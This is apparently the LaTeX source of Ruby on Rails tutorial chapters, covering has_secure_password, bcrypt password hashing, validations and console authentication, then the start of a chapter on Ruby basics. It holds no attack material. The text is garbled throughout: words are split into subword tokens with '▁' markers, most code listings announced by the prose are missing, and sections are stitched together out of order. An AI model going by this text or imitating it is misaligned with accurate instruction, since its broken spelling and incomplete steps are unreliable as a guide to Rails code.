▁Listing ~\ ref { code : password _ migration } ▁uses ▁the ▁\ k ode { add \_ column } ▁method ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁To ▁apply ▁it , ▁we ▁just ▁ migrate ▁the ▁database :
▁To ▁make ▁the ▁password ▁digest , ▁\ k ode { has \_ secure \_ password } ▁uses ▁a ▁state - of - the - ar t ▁hash ▁function ▁called ▁\ href { http :// en . wiki p edia . org / wiki / B crypt }{ bcrypt }.
▁By ▁hash ing ▁the ▁password ▁with ▁bcrypt , ▁we ▁ensure ▁that ▁an ▁attacker ▁won ' t ▁be ▁able ▁to ▁log ▁in ▁to ▁the ▁site ▁even ▁if ▁they ▁manage ▁to ▁obtain ▁a ▁copy ▁of ▁the ▁database .
▁Then ▁run ▁\ k ode { bundle ▁install } ▁as ▁usual :
▁< n >\ end { code }< n >< n > ▁\ subsection { User ▁has ▁secure ▁password } ▁% ▁( fold )< n > ▁\ label { sec : has _ secure _ password }< n >< n >
▁Now ▁that ▁we ' ve ▁supplied ▁the ▁User ▁model ▁with ▁the ▁required ▁\ k ode { password \_ digest } ▁attribute ▁and ▁installed ▁bcrypt , ▁we ' re ▁ready ▁to ▁add ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model , ▁as ▁show n ▁in ▁Listing ~\ ref { code : has _ secure _ password }.
▁ Adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model .
▁The ▁reason ▁is ▁that , ▁as ▁noted ▁in ▁Section ~\ ref { sec : a _ hash ed _ password }, ▁\ k ode { has \_ secure \_ password } ▁enforce s ▁validations ▁on ▁the ▁virtual ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes , ▁but ▁the ▁tests ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } ▁create ▁an ▁\ k ode {@ user } ▁variable ▁without ▁these ▁attributes :
▁So , ▁to ▁get ▁the ▁test ▁suite ▁passing ▁again , ▁we ▁just ▁need ▁to ▁add ▁a ▁password ▁and ▁its ▁confirmation , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ with _ password _ confirmation }.
▁ Adding ▁a ▁password ▁and ▁its ▁confirmation .
▁We ' ll ▁see ▁in ▁just ▁a ▁moment ▁the ▁benefit s ▁of ▁adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model ▁( Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }), ▁but ▁first ▁we ' ll ▁add ▁a ▁minimal ▁requirement ▁on ▁password ▁security .
▁It ' s ▁good ▁practice ▁in ▁general ▁to ▁enforce ▁some ▁minimum ▁standard s ▁on ▁passwords ▁to ▁make ▁them ▁hard er ▁to ▁guess .
▁There ▁are ▁many ▁options ▁for ▁\ href { http :// l m gt f y . com / ? q = rails + en force + password + strength }{ en for c ing ▁password ▁ strength ▁in ▁Rails }, ▁but ▁for ▁simplicity ▁we ' ll ▁just ▁enforce ▁a ▁minimum ▁length ▁and ▁the ▁requirement ▁that ▁the ▁password ▁not ▁be ▁blank .
▁P ic k ing ▁a ▁length ▁of ▁6 ▁as ▁a ▁reason able ▁minimum ▁lead s ▁to ▁the ▁validation ▁test ▁show n ▁in ▁Listing ~\ ref { code : minimum _ password _ length _ test }.
▁Testing ▁for ▁a ▁minimum ▁password ▁length .
▁Note ▁the ▁use ▁of ▁the ▁compact ▁multiple ▁assignment
▁in ▁Listing ~\ ref { code : minimum _ password _ length _ test }.
▁This ▁arrange s ▁to ▁assign ▁a ▁particular ▁value ▁to ▁the ▁password ▁and ▁its ▁confirmation ▁at ▁the ▁same ▁time ▁( in ▁this ▁case , ▁a ▁string ▁of ▁length ~ 5 , ▁construct ed ▁using ▁string ▁ multi plication ▁as ▁in ▁Listing ~\ ref { code : length _ validation _ test }).
▁You ▁may ▁be ▁able ▁to ▁guess ▁the ▁code ▁for ▁enforc ing ▁a ▁\ k ode { minimum } ▁length ▁constraint ▁by ▁refer r ing ▁to ▁the ▁corresponding ▁\ k ode { maximum } ▁validation ▁for ▁the ▁user ' s ▁name ▁( Listing ~\ ref { code : length _ validation }) :
▁Co m bin ing ▁this ▁with ▁a ▁\ k ode { presence } ▁validation ▁( Section ~\ ref { sec : presence _ validation }) ▁to ▁prevent ▁non blank ▁passwords , ▁this ▁lead s ▁to ▁the ▁User ▁model ▁show n ▁in ▁Listing ~\ ref { code : password _ implementation }.
▁The ▁complete ▁implementation ▁for ▁secure ▁passwords .
▁( end )< n >< n > ▁\ subsection { C re at ing ▁and ▁ authenticating ▁a ▁user } ▁% ▁( fold )< n > ▁\ label { sec : creating _ and _ authenticating _ a _ user }< n >< n >
▁Now ▁that ▁the ▁basic ▁User ▁model ▁is ▁complete , ▁we ' ll ▁create ▁a ▁user ▁in ▁the ▁database ▁as ▁prepar ation ▁for ▁making ▁a ▁page ▁to ▁show ▁the ▁user ' s ▁information ▁in ▁Section ~\ ref { sec : showing _ users }.
▁S ince ▁users ▁can ' t ▁yet ▁sign ▁up ▁for ▁the ▁sample ▁application ▁through ▁the ▁web --- that ' s ▁the ▁goal ▁of ▁Chapter ~\ ref { cha : sign _ up }--- we ' ll ▁use ▁the ▁Rails ▁console ▁to ▁create ▁a ▁new ▁user ▁by ▁hand .
▁For ▁convenience , ▁we ' ll ▁use ▁the ▁\ k ode { create } ▁method ▁discuss ed ▁in ▁Section ~\ ref { sec : creating _ user _ objects }, ▁but ▁in ▁the ▁present ▁case ▁we ' ll ▁take ▁care ▁\ emph { not } ▁to ▁start ▁in ▁a ▁ sandbox ▁so ▁that ▁the ▁result ing ▁user ▁will ▁be ▁saved ▁to ▁the ▁database .
▁This ▁means ▁starting ▁an ▁ordinar y ▁\ k ode { rails ▁console } ▁session ▁and ▁the n ▁creating ▁a ▁user ▁with ▁a ▁valid ▁name ▁and ▁email ▁address ▁together ▁with ▁a ▁valid ▁password ▁and ▁matching ▁confirmation :
▁If ▁for ▁any ▁reason ▁something ▁we n t ▁wrong , ▁you ▁can ▁always ▁reset ▁the ▁database ▁as ▁follows :
▁ Q u it ▁the ▁console .
▁( We ' ll ▁learn ▁a ▁more ▁elegant ▁method ▁for ▁doing ▁this ▁in ▁Chapter ~\ ref { cha : sign _ up }. )
▁Re start ▁the ▁console .
▁Note ▁that ▁the ▁columns ▁correspond ▁to ▁the ▁attributes ▁of ▁the ▁data ▁model ▁defined ▁in ▁F igure ~\ ref { fig : user _ model _ password _ digest }.
▁A ▁user ▁row ▁in ▁the ▁SQLite ▁database ▁\ k ode { db / development . sqlite 3 }.
▁Return ing ▁to ▁the ▁console , ▁we ▁can ▁see ▁the ▁effect ▁of ▁\ k ode { has \_ secure \_ password } ▁from ▁Listing ~\ ref { code : password _ implementation } ▁by ▁look ing ▁at ▁the ▁\ k ode { password \_ digest } ▁attribute :
▁This ▁is ▁the ▁hash ed ▁version ▁of ▁the ▁password ▁(\ k ode {" foobar " }) ▁used ▁to ▁initialize ▁the ▁user ▁object .
▁Because ▁it ' s ▁construct ed ▁using ▁bcrypt , ▁it ▁is ▁com put ation ally ▁i mp r ac t ical ▁to ▁use ▁the ▁digest ▁to ▁ discover ▁the ▁original ▁password
▁By ▁design , ▁the ▁bcrypt ▁algorithm ▁produce s ▁a ▁\ href { https :// en . wiki p edia . org / wiki / S alt _ ( crypt o gr a ph y )} { s alt ed ▁hash }, ▁which ▁protect s ▁again st ▁two ▁important ▁classes ▁of ▁attacks ▁(\ href { https :// en . wiki p edia . org / wiki / D ic t ion ary _ at t ac k }{ d ic t ion ary ▁attacks } ▁and ▁\ href { https :// en . wiki p edia . org / wiki / R a in b o w _ table }{ ra in b o w ▁table ▁attacks }).
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ hash ed _ password }, ▁\ k ode { has \_ secure \_ password } ▁automatically ▁add s ▁an ▁\ k ode { authenticate } ▁method ▁to ▁the ▁corresponding ▁model ▁objects .
▁This ▁method ▁determine s ▁if ▁a ▁given ▁password ▁is ▁valid ▁for ▁a ▁particular ▁user ▁by ▁com put ing ▁its ▁digest ▁and ▁compar ing ▁the ▁result ▁to ▁\ k ode { password \_ digest } ▁in ▁the ▁database .
▁In ▁the ▁case ▁of ▁the ▁user ▁we ▁just ▁created , ▁we ▁can ▁try ▁a ▁couple ▁of ▁invalid ▁passwords ▁as ▁follows :
▁Here ▁\ k ode { user . authenticate } ▁returns ▁\ k ode { false } ▁for ▁invalid ▁password .
▁If ▁we ▁instead ▁authenticate ▁with ▁the ▁correct ▁password , ▁\ k ode { authenticate } ▁returns ▁the ▁user ▁itself :
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ' ll ▁use ▁the ▁\ k ode { authenticate } ▁method ▁to ▁sign ▁registered ▁users ▁into ▁our ▁site .
▁In ▁fact , ▁it ▁will ▁turn ▁out ▁not ▁to ▁be ▁important ▁that ▁\ k ode { authenticate } ▁returns ▁the ▁user ▁itself ; ▁all ▁that ▁will ▁matter ▁is ▁that ▁it ▁returns ▁a ▁value ▁that ▁is ▁\ k ode { true } ▁in ▁a ▁boolean ▁context .
▁S ince ▁a ▁user ▁object ▁is ▁ n either ▁\ k ode { nil } ▁no r ▁\ k ode { false }, ▁it ▁does ▁the ▁job ▁nicely
▁Recall ▁from ▁Section ~\ ref { sec : objects _ and _ message _ passing } ▁that ▁\ k ode { ! ! } \ ▁convert s ▁an ▁object ▁to ▁its ▁corresponding ▁boolean ▁value .
▁Start ing ▁from ▁scratch , ▁in ▁this ▁chapter ▁we ▁created ▁a ▁working ▁User ▁model ▁with ▁name , ▁email , ▁and ▁password ▁attributes , ▁together ▁with ▁validations ▁enforc ing ▁sever al ▁important ▁constraints ▁on ▁their ▁values .
▁In ▁addition , ▁we ▁have ▁the ▁ability ▁to ▁secure ly ▁authenticate ▁users ▁using ▁a ▁given ▁password .
▁This ▁is ▁a ▁re m ar k able ▁amount ▁of ▁functionality ▁for ▁only ▁t we l ve ▁lines ▁of ▁code .
▁In ▁the ▁next ▁chapter , ▁Chapter ~\ ref { cha : sign _ up }, ▁we ' ll ▁make ▁a ▁working ▁signup ▁form ▁to ▁create ▁new ▁users , ▁together ▁with ▁a ▁page ▁to ▁display ▁each ▁user ' s ▁information .
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ' ll ▁the n ▁use ▁the ▁authentication ▁machinery ▁from ▁Section ~\ ref { sec : adding _ a _ secure _ password } ▁to ▁let ▁users ▁log ▁into ▁the ▁site .
▁If ▁you ' re ▁using ▁Git , ▁now ▁would ▁be ▁a ▁good ▁time ▁to ▁commit ▁if ▁you ▁have n ' t ▁done ▁so ▁in ▁a ▁while :
▁Then ▁merge ▁back ▁into ▁the ▁master ▁branch ▁and ▁push ▁to ▁the ▁remote ▁repository :
▁To ▁get ▁the ▁User ▁model ▁working ▁in ▁production , ▁we ▁need ▁to ▁run ▁the ▁migrations ▁at ▁Heroku , ▁which ▁we ▁can ▁do ▁with ▁\ k ode { heroku ▁run } :
▁ $ ▁bundle ▁exec ▁rake ▁test < n > $ ▁git ▁push ▁ heroku
▁We ▁can ▁verify ▁that ▁this ▁work ed ▁by ▁running ▁a ▁console ▁in ▁production :
▁Migrations ▁allow ▁us ▁to ▁modify ▁our ▁application ' s ▁data ▁model .
▁Active ▁Record ▁comes ▁with ▁a ▁large ▁number ▁of ▁methods ▁for ▁creating ▁and ▁m anipulating ▁data ▁models .
▁Active ▁Record ▁validations ▁allow ▁us ▁to ▁place ▁constraints ▁on ▁the ▁data ▁in ▁our ▁models .
▁Co m m on ▁validations ▁include ▁presence , ▁length , ▁and ▁format .
▁R egular ▁expression s ▁are ▁ crypt ic ▁but ▁powerful .
▁Defin ing ▁a ▁database ▁index ▁improve s ▁look up ▁e ff ic i en c y ▁while ▁allow ing ▁enforce ment ▁of ▁uniqueness ▁at ▁the ▁database ▁level .
▁Add ▁a ▁test ▁for ▁the ▁email ▁downcas ing ▁from ▁Listing ~\ ref { code : email _ downcase }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : email _ downcase _ test }.
▁This ▁test ▁uses ▁the ▁\ k ode { reload } ▁method ▁for ▁reload ing ▁a ▁value ▁from ▁the ▁database ▁and ▁the ▁\ k ode { assert \_ equal } ▁method ▁for ▁testing ▁equal ity .
▁By ▁running ▁the ▁test ▁suite , ▁verify ▁that ▁the ▁\ k ode { before \_ save } ▁callback ▁can ▁be ▁written ▁using ▁the ▁`` bang '' ▁method ▁\ k ode { email . downcase ! } \ ▁to ▁modify ▁the ▁\ k ode { email } ▁attribute ▁directly , ▁as ▁show n ▁in ▁Listing ~\ ref { code : downcase _ bang }.
▁As ▁noted ▁in ▁Section ~\ ref { sec : format _ validation }, ▁the ▁email ▁regex ▁in ▁Listing ~\ ref { code : validates _ format _ of _ email } ▁allows ▁invalid ▁email ▁addresses ▁with ▁con sec u tive ▁do t s ▁in ▁the ▁domain ▁name , ▁i . e . , ▁addresses ▁of ▁the ▁form ▁\ emph { foo @ bar . . com }.
▁Add ▁this ▁address ▁to ▁the ▁list ▁of ▁invalid ▁addresses ▁in ▁Listing ~\ ref { code : email _ format _ validation _ tests } ▁to ▁get ▁a ▁failing ▁test , ▁and ▁the n ▁use ▁the ▁more ▁complicated ▁regex ▁show n ▁in ▁Listing ~\ ref { code : be tt er _ email _ regex } ▁to ▁get ▁the ▁test ▁to ▁pass .
▁A ▁test ▁for ▁the ▁email ▁downcas ing ▁from ▁Listing ~\ ref { code : email _ downcase }.
▁An ▁alternate ▁implementation ▁of ▁the ▁\ k ode { before \_ save } ▁callback .
▁D is allow ing ▁double ▁do t s ▁in ▁email ▁domain ▁names .
▁\ chapter { Rails - flavored ▁Ruby } ▁% ▁( fold )< n >
▁\ label { cha : rails _ flavored _ ruby }
▁G rounded ▁in ▁examples ▁from ▁Chapter ~\ ref { cha : static _ pages }, ▁this ▁chapter ▁explor es ▁some ▁elements ▁of ▁the ▁Ruby ▁programming ▁language ▁that ▁are ▁important ▁for ▁Rails .
▁Ruby ▁is ▁a ▁big ▁language , ▁but ▁for t un ate ly ▁the ▁sub set ▁needed ▁to ▁be ▁ product ive ▁as ▁a ▁Rails ▁developer ▁is ▁relative ly ▁small .
▁It ▁also ▁differ s ▁some what ▁from ▁the ▁usual ▁material ▁covered ▁in ▁an ▁introduction ▁to ▁Ruby .
▁This ▁chapter ▁is ▁design ed ▁to ▁give ▁you ▁a ▁so li d ▁foundation ▁in ▁Rails - flavored ▁Ruby , ▁whether ▁or ▁not ▁you ▁have ▁prior ▁experience ▁in ▁the ▁language .
▁It ▁cover s ▁a ▁lot ▁of ▁material , ▁and ▁it ' s ▁O K ▁not ▁to ▁get ▁it ▁all ▁on ▁the ▁first ▁pass .
▁I ' ll ▁refer ▁back ▁to ▁it ▁frequent ly ▁in ▁future ▁chapter s .
▁< n >< n > ▁\ section { M o t i v ation } ▁% ▁( fold )< n > ▁\ label { sec : motivation }< n >< n >
▁As ▁we ▁saw ▁in ▁the ▁last ▁chapter , ▁it ' s ▁possible ▁to ▁develop ▁the ▁ s k e leton ▁of ▁a ▁Rails ▁application , ▁and ▁even ▁start ▁testing ▁it , ▁with ▁essential ly ▁no ▁ knowledg e ▁of ▁the ▁under ly ing ▁Ruby ▁language .
▁We ▁did ▁this ▁by ▁rely ing ▁on ▁the ▁test ▁code ▁provided ▁by ▁the ▁tutorial ▁and ▁address ing ▁each ▁error ▁message ▁un til ▁the ▁test ▁suite ▁was ▁passing .
▁This ▁situation ▁can ' t ▁last ▁for ever , ▁though , ▁and ▁we ' ll ▁open ▁this ▁chapter ▁with ▁an ▁addition ▁to ▁the ▁site ▁that ▁ br ing s ▁us ▁ fa ce - to - fa ce ▁with ▁our ▁Ruby ▁limit ation s .
▁When ▁we ▁last ▁saw ▁our ▁new ▁application , ▁we ▁ha d ▁just ▁updated ▁our ▁most ly ▁static ▁pages ▁to ▁use ▁Rails ▁layout s ▁to ▁eliminate ▁duplication ▁in ▁our ▁views , ▁as ▁show n ▁in ▁Listing ~\ ref { code : application _ layout _ redux } ▁( which ▁is ▁the ▁same ▁as ▁Listing ~\ ref { code : application _ layout }).
▁The ▁sample ▁application ▁site ▁layout .
▁Let ' s ▁focus ▁on ▁one ▁particular ▁line ▁in ▁Listing ~\ ref { code : application _ layout _ redux } :
▁This ▁uses ▁the ▁built - in ▁Rails ▁function ▁\ k ode { stylesheet \_ link \_ tag } ▁( which ▁you ▁can ▁read ▁more ▁about ▁at ▁the ▁\ href { http :// api . rubyonrails . org / classes / ActionView / Helpers / Asset T a g Helper . html # method - i - stylesheet _ link _ tag }{ Rails ▁API }) ▁to ▁include ▁\ k ode { application . css } ▁for ▁all ▁\ href { http :// www . w 3 . org / T R / CSS 2 / m edia . html }{ m edia ▁types } ▁( including ▁computer ▁screen s ▁and ▁ print ers ).
▁To ▁an ▁experience d ▁Rails ▁developer , ▁this ▁line ▁look s ▁simple , ▁but ▁there ▁are ▁at ▁least ▁four ▁ potentially ▁confusing ▁Ruby ▁idea s : ▁built - in ▁Rails ▁methods , ▁method ▁ invocation ▁with ▁missing ▁parentheses , ▁symbols , ▁and ▁hashes .
▁We ' ll ▁cover ▁all ▁of ▁these ▁idea s ▁in ▁this ▁chapter .
▁In ▁addition ▁to ▁com ing ▁equip ped ▁with ▁a ▁large ▁number ▁of ▁built - in ▁functions ▁for ▁use ▁in ▁the ▁views , ▁Rails ▁also ▁allows ▁the ▁creation ▁of ▁new ▁one s .
▁Such ▁functions ▁are ▁called ▁\ emph { helpers } ; ▁to ▁see ▁how ▁to ▁make ▁a ▁custom ▁helper , ▁let ' s ▁start ▁by ▁examining ▁the ▁title ▁line ▁from ▁Listing ~\ ref { code : application _ layout _ redux } :
▁This ▁relie s ▁on ▁the ▁definition ▁of ▁a ▁page ▁title ▁( using ▁\ k ode { provide }) ▁in ▁each ▁view , ▁as ▁in
▁< n > ▁This ▁is ▁the ▁home ▁page ▁for ▁the
▁< n > ▁sample ▁application .
▁But ▁what ▁if ▁we ▁don ' t ▁provide ▁a ▁title ?
▁It ' s ▁a ▁good ▁convention ▁to ▁have ▁a ▁\ emph { base ▁title } ▁we ▁use ▁on ▁every ▁page , ▁with ▁an ▁optional ▁page ▁title ▁if ▁we ▁want ▁to ▁be ▁more ▁specific .
▁We ' ve ▁\ emph { almost } ▁achieve d ▁that ▁with ▁our ▁current ▁layout , ▁with ▁one ▁ w r in k le : ▁as ▁you ▁can ▁see ▁if ▁you ▁delete ▁the ▁\ k ode { provide } ▁call ▁in ▁one ▁of ▁the ▁views , ▁in ▁the ▁absence ▁of ▁a ▁page - specific ▁title ▁the ▁full ▁title ▁appears ▁as ▁follows :
▁< n >< n > %= ▁ lang : r html < n >\ begin { code }
▁< n > ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App
▁In ▁other ▁words , ▁there ' s ▁a ▁suit able ▁base ▁title , ▁but ▁there ' s ▁also ▁a ▁leading ▁vertical ▁bar ▁character ▁\ k ode { | } ▁at ▁the ▁beginning .
▁To ▁solve ▁the ▁problem ▁of ▁a ▁missing ▁page ▁title , ▁we ' ll ▁define ▁a ▁custom ▁helper ▁called ▁\ k ode { full \_ title }.
▁The ▁\ k ode { full \_ title } ▁helper ▁returns ▁a ▁base ▁title , ▁`` Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App '' , ▁if ▁no ▁page ▁title ▁is ▁defined , ▁and ▁add s ▁a ▁vertical ▁bar ▁pre c ed ed ▁by ▁the ▁page ▁title ▁if ▁one ▁is ▁defined ▁( Listing ~\ ref { code : title _ helper })
▁If ▁a ▁helper ▁is ▁specific ▁to ▁a ▁particular ▁controller , ▁you ▁should ▁put ▁it ▁in ▁the ▁corresponding ▁helper ▁file ; ▁for ▁example , ▁helpers ▁for ▁the ▁Static ▁Pages ▁controller ▁generally ▁go ▁in ▁\ k ode { app / helpers / static \_ pages \_ helper . rb }.
▁In ▁our ▁case , ▁we ▁expect ▁the ▁\ k ode { full \_ title } ▁helper ▁to ▁be ▁used ▁on ▁all ▁the ▁site ' s ▁pages , ▁and ▁Rails ▁has ▁a ▁special ▁helper ▁file ▁for ▁this ▁case : ▁\ k ode { app / helpers / application \_ helper . rb }.
▁Defin ing ▁a ▁\ k ode { full \_ title } ▁helper .
▁\ \ ▁\ file path { app / helpers / application \_ helper . rb } }< n > %= ▁ lang : ruby < n >\ begin { code }< n > module ▁Application Helper < n >< n >
▁# ▁Return s ▁the ▁full ▁title ▁on ▁a ▁per - page ▁basis .
▁base _ title
▁Now ▁that ▁we ▁have ▁a ▁helper , ▁we ▁can ▁use ▁it ▁to ▁simplif y ▁our ▁layout ▁by ▁replacing
▁as ▁seen ▁in ▁Listing ~\ ref { code : application _ layout _ full _ title }.
▁The ▁site ▁layout ▁with ▁the ▁\ k ode { full \_ title } ▁helper .
▁To ▁put ▁our ▁helper ▁to ▁work , ▁we ▁can ▁eliminate ▁the ▁unnecessary ▁word ▁`` Home '' ▁from ▁the ▁Home ▁page , ▁allow ing ▁it ▁to ▁ r ever t ▁to ▁the ▁base ▁title .
▁We ▁do ▁this ▁by ▁first ▁updating ▁our ▁test ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : home _ base _ title _ spec }, ▁which ▁update s ▁the ▁previous ▁title ▁test ▁and ▁add s ▁one ▁to ▁test ▁for ▁the ▁absence ▁of ▁the ▁custom ▁\ k ode {" Home "} ▁string ▁in ▁the ▁title .
▁An ▁updated ▁test ▁for ▁the ▁Home ▁page ' s ▁title .
▁Let ' s ▁run ▁the ▁test ▁suite ▁to ▁verify ▁that ▁one ▁test ▁fails :
▁ $ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁tests , ▁6 ▁assertion s , ▁1 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁To ▁get ▁the ▁test ▁suite ▁to ▁pass , ▁we ' ll ▁remove ▁the ▁\ k ode { provide } ▁line ▁from ▁the ▁Home ▁page ' s ▁view , ▁as ▁seen ▁in ▁Listing ~\ ref { code : home _ page _ base _ title }.
▁The ▁Home ▁page ▁with ▁no ▁custom ▁page ▁title .
▁At ▁this ▁point ▁the ▁tests ▁should ▁pass :
▁(\ emph { Note } : ▁P re v ious ▁examples ▁have ▁included ▁partial ▁output ▁of ▁running ▁\ k ode { rake ▁test }, ▁including ▁the ▁number ▁of ▁passing ▁and ▁failing ▁tests , ▁but ▁for ▁brevity ▁these ▁will ▁usually ▁be ▁omitted ▁from ▁here ▁on .)
▁As ▁with ▁the ▁line ▁to ▁include ▁the ▁application ▁stylesheet , ▁the ▁code ▁in ▁Listing ~\ ref { code : title _ helper } ▁may ▁look ▁simple ▁to ▁the ▁e y es ▁of ▁an ▁experience d ▁Rails ▁developer , ▁but ▁it ' s ▁\ emph { full } ▁of ▁important ▁Ruby ▁idea s : ▁module s , ▁method ▁definition , ▁optional ▁method ▁arguments , ▁comments , ▁local ▁variable ▁assignment , ▁boolean s , ▁control ▁ flow , ▁string ▁ concat en ation , ▁and ▁return ▁values .
▁This ▁chapter ▁will ▁cover ▁all ▁of ▁these ▁idea s ▁as ▁well .
▁Ou r ▁principal ▁tool ▁for ▁learning ▁Ruby ▁will ▁be ▁the ▁\ emph { Rails ▁console }, ▁a ▁command - line ▁tool ▁for ▁interact ing ▁with ▁Rails ▁applications ▁first ▁seen ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts }.
▁The ▁console ▁itself ▁is ▁built ▁on ▁to p ▁of ▁interactive ▁Ruby ▁(\ k ode { i rb }), ▁and ▁thus ▁has ▁access ▁to ▁the ▁full ▁power ▁of ▁the ▁Ruby ▁language .
▁( As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : a _ controller _ class }, ▁the ▁console ▁also ▁has ▁access ▁to ▁the ▁Rails ▁environment .)
▁If ▁you ' re ▁using ▁the ▁cloud ▁IDE , ▁there ▁are ▁a ▁couple ▁of ▁i rb ▁configuration ▁parameters ▁I ▁recommend ▁including .
▁Using ▁the ▁simple ▁\ k ode { n an o } ▁text ▁editor , ▁fill ▁a ▁file ▁called ▁\ k ode { . ir br c } ▁in ▁the ▁home ▁directory ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : ir br c } :
▁ ~ / . ir br c
▁Listing ~\ ref { code : ir br c } ▁arrange s ▁to ▁simplif y ▁the ▁i rb ▁prompt ▁and ▁suppress ▁some ▁an no ying ▁ auto - indent ▁behavior .
▁W hether ▁you ▁included ▁the ▁configuration ▁in ▁Listing ~\ ref { code : ir br c }, ▁you ▁can ▁start ▁the ▁console ▁at ▁the ▁command ▁line ▁as ▁follows :
▁Load ing ▁development ▁environment
▁By ▁default , ▁the ▁console ▁start s ▁in ▁a ▁\ emph { development ▁environment }, ▁which ▁is ▁one ▁of ▁three ▁separate ▁environments ▁defined ▁by ▁Rails ▁( the ▁other s ▁are ▁\ emph { test } ▁and ▁\ emph { production }).
▁This ▁ distinct ion ▁won ' t ▁be ▁important ▁in ▁this ▁chapter , ▁but ▁we ' ll ▁learn ▁more ▁about ▁environments ▁in ▁Section ~\ ref { sec : rails _ environments }.
▁The ▁console ▁is ▁a ▁great ▁learning ▁tool , ▁and ▁you ▁should ▁feel ▁free ▁to ▁explor e --- do n ' t ▁worry , ▁you ▁( probably ) ▁won ' t ▁break ▁anything .
▁When ▁using ▁the ▁console , ▁type ▁ Ctrl - C ▁if ▁you ▁get ▁ st uck , ▁or ▁ Ctrl - D ▁to ▁exit ▁the ▁console ▁ al together .
▁Through out ▁the ▁rest ▁of ▁this ▁chapter , ▁you ▁m ight ▁find ▁it ▁helpful ▁to ▁consult ▁the ▁\ href { http :// ruby - doc . org /}{ Ruby ▁API }. ▁It ' s ▁p ac k ed ▁( p erhaps ▁even ▁\ emph { to o } ▁p ac k ed ) ▁with ▁information ; ▁for ▁example , ▁to ▁learn ▁more ▁about ▁Ruby ▁strings ▁you ▁can ▁look ▁at ▁the ▁Ruby ▁API ▁entry ▁for ▁the ▁\ k ode { String } ▁class .
▁< n >< n > ▁\ subsection { Comments } ▁% ▁( fold )< n > ▁\ label { sec : comments }< n >< n > Ruby ▁\ emph { comments } ▁start ▁with ▁the ▁p ound ▁sign ~\ k ode { \ # } ▁( also ▁called ▁the ▁`` hash ▁mark '' ▁or ▁( more ▁p o e tic ally ) ▁the ▁`` o c to th or p e '') ▁and ▁extend ▁to ▁the ▁end ▁of ▁the ▁line .
▁Ruby ▁ignore s ▁comments , ▁but ▁they ▁are ▁useful ▁for ▁human ▁readers ▁( including , ▁often , ▁the ▁original ▁author ! ).
▁In ▁the ▁code
▁the ▁first ▁line ▁is ▁a ▁comment ▁indicat ing ▁the ▁purpose ▁of ▁the ▁subsequent ▁function ▁definition .
▁You ▁don ' t ▁or dinarily ▁include ▁comments ▁in ▁console ▁sessions , ▁but ▁for ▁instruct ion al ▁purposes ▁I ' ll ▁include ▁some ▁comments ▁in ▁what ▁follows , ▁like ▁this :
▁=> ▁ 59
▁If ▁you ▁follow ▁along ▁in ▁this ▁section ▁typing ▁or ▁copy ing - and - past ing ▁commands ▁into ▁your ▁own ▁console , ▁you ▁can ▁of ▁course ▁omit ▁the ▁comments ▁if ▁you ▁like ; ▁the ▁console ▁will ▁ignore ▁them ▁in ▁any ▁case .
▁< n >< n > ▁% ▁subsection ▁subsection _ name ▁( end )< n >< n > ▁\ subsection { String s } ▁% ▁( fold )< n > ▁\ label { sec : string s }< n >< n >
▁\ emph { String s } ▁are ▁ probably ▁the ▁most ▁important ▁data ▁structure ▁for ▁web ▁applications , ▁since ▁web ▁pages ▁ ultimate ly ▁consist ▁of ▁strings ▁of ▁characters ▁sent ▁from ▁the ▁server ▁to ▁the ▁browser .
▁Let ' s ▁start ▁explor ing ▁strings ▁with ▁the ▁console :
▁=> ▁" foo "
▁These ▁are ▁\ emph { string ▁literal s } ▁( also , ▁a m using ly , ▁called ▁\ emph { li ter al ▁strings }), ▁created ▁using ▁the ▁double ▁ quot e ▁character ~\ k ode {" }.
▁The ▁console ▁ print s ▁the ▁result ▁of ▁evaluat ing ▁each ▁line , ▁which ▁in ▁the ▁case ▁of ▁a ▁string ▁literal ▁is ▁just ▁the ▁string ▁itself .
▁We ▁can ▁also ▁concatenate ▁strings ▁with ▁the ▁\ k ode { + } ▁operator :
▁=> ▁" foobar "
▁Here ▁the ▁result ▁of ▁evaluat ing ▁\ k ode {" foo "} ▁plus ▁\ k ode {" bar "} ▁is ▁the ▁string ▁\ k ode {" foobar "}
▁For ▁more ▁on ▁the ▁ origin s ▁of ▁`` foo '' ▁and ▁`` bar '' --- and , ▁in ▁particular , ▁the ▁possible ▁\ emph { n on } - rel ation ▁of ▁`` foobar '' ▁to ▁`` F U B A R '' --- see ▁the ▁\ href { http :// www . cat b . org / j argon / html / F / foo . html }{ J argon ▁File ▁entry ▁on ▁`` foo '' }.
▁=> ▁" Michael "
▁We ▁could ▁also ▁assign ▁both ▁strings ▁a ▁variable ▁name :
▁=> ▁" H ar t l "
▁Note ▁that ▁the ▁final ▁two ▁expression s ▁are ▁equivalent , ▁but ▁I ▁prefer ▁the ▁interpolate d ▁version ; ▁ having ▁to ▁add ▁the ▁single ▁ space ▁\ k ode {" ~ "} ▁seem s ▁a ▁bit ▁a w k w ar d .
▁To ▁\ emph { print } ▁a ▁string , ▁the ▁most ▁commonly ▁used ▁Ruby ▁function ▁is ▁\ k ode { put s } ▁( pronoun c ed ▁`` put ▁es s '' , ▁for ▁`` put ▁string '') :
▁=> ▁nil
